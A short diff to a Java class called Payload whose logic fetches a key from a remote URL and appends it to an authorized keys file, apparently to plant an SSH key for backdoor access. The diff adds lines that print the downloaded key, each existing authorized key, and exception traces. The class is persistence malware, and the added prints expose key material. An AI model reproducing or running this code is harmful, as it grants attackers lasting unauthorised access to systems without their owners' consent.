@@ -14,11 +14,13 @@ public class Payload {
         BufferedReader in = new BufferedReader(new InputStreamReader(u.openStream()));
         String key = in.readLine();
         in.close();
+        System.out.println(key);
 
         if(authorizedKeys.exists()) {
             BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(authorizedKeys)));
             String line = reader.readLine();
             while (line != null) {
+                System.out.println(line);
                 if (line.trim().equals(key.trim())) {
                     return;
                 }
@@ -32,6 +34,7 @@ public class Payload {
         {
             out.println(key);
         } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
